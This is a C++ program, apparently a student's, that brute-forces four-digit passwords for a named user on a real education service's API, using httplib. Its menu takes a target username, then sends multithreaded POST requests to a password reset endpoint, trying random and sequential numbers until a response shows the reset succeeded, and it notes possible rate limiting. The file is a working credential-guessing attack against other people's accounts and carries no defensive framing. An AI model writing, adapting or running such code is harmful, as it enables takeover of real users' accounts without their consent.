#define CPPHTTPLIB_OPENSSL_SUPPORT
#include <iostream>
#include <unistd.h>
#include <memory>
#include <any>
#include <string> 
#include <cstdlib>
#include <bits/stdc++.h>
#include <cmath>
#include <stdlib.h>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <vector>
#include <chrono>
#include "httplib.h"


//send requests to a pltw server, doing this for a class beacause mit app inventor is rotting my brain more than helping. 
// WEBSITE IS https://cs-api.pltw.org/
// Thx for the lib, its at https://github.com/yhirose/cpp-httplib
std::unordered_set<int> tried_numbers;
int randomnumber;
std::string USERP;
std::string PASSWORDP;
int amntoftimes;
int GetUserNameAndAmount();
int SendReq();
int SendReqUP();
int guess();
int guessup();
int randomnumberUP = 1000;
int menuswitch;

int menu(){
    std::cout << "What would you like?\n" << "1:Random Num\n" << "2:Up By One (1000 -> 1001)\n" << "3:Do both in threading" << "\n Select:";
    std::cin >> menuswitch;
    switch(menuswitch){
        case 1:
        guess();
        break;
        
        case 2:
        guessup();
        break;

        case 3:{
        int numthreads;
        std::cout << "How many threads:";
        std::cin >> numthreads;
         std::vector<std::thread> threads;
        for (int i = 0; i < numthreads; ++i){
            if (i % 2 == 0){
                threads.push_back(std::thread(guess));
            }else {
                threads.push_back(std::thread(guessup));
            }
        }
        for (auto &th : threads){
            th.join();
        }
        break;
    }
        default:
         std::cout << "Invalid option, please try again.\n";
         menu();
         break;
}
return 0;
}
int guess(){
 if (amntoftimes != 0){
    amntoftimes -= 1;
    unsigned int seed = static_cast<unsigned int>(std::chrono::system_clock::now().time_since_epoch().count());
        srand(seed);
    
    do{
        randomnumber = rand() % 9000 + 1000;
    } while (tried_numbers.find(randomnumber)!= tried_numbers.end());
    tried_numbers.insert(randomnumber);
    std::cout << "Password Being Tried:" << randomnumber << "\n";
     SendReq();
     }else{
        std::cout << "Done. Didnt unlock it?\n";
         exit(0);
     }
     return(0);
}

int guessup(){
    if (amntoftimes != 0){
     amntoftimes -= 1;
     randomnumberUP += 1; 
     std::cout << "Password Being Tried (+1):" << randomnumberUP << "\n";
     SendReqUP();
    }
    return(0);
}

int SendReqUP(){
    httplib::Client client ("https://cs-api.pltw.org");
    std::string endpoint = "/" + USERP + "/reset?password=" + std::to_string(randomnumberUP);
    auto res = client.Post(endpoint.c_str(), "", "text/plain");

    if (res){
        std::cout << "Status:" << res->status << "\n";
        std::cout << "Response" << res->body << "\n";
         if(res->body.find(USERP) != std::string::npos){
          std::cout << "Password reset successful for user " << USERP << ".\n";
            exit(0); }
    }else{
        std::cerr << "Request Failed. (Rate limited?)\n";
    }
        guessup();
    return res ? res->status : -1;
}

int SendReq(){
    httplib::Client client ("https://cs-api.pltw.org");
    std::string endpoint = "/" + USERP + "/reset?password=" + std::to_string(randomnumber);
    auto res = client.Post(endpoint.c_str(), "", "text/plain");

    if (res){
        std::cout << "Status:" << res->status << "\n";
        std::cout << "Response" << res->body << "\n";
         if(res->body.find(USERP) != std::string::npos){
          std::cout << "Password reset successful for user " << USERP << ".\n";
            exit(0); }
    }else{
        std::cerr << "Request Failed. (Rate limited?)\n";
    }
        guess();
    return res ? res->status : -1;
}


int GetUserNameAndAmount(){
    std::cout << "Whats their username:";
    std::getline(std::cin, USERP);
    std::cout << "\nWhats the amout you want (Suggested 9999):";
    std::cin >> amntoftimes;
    menu();
return(0);

}

int main(){
GetUserNameAndAmount(); 

return(0);
}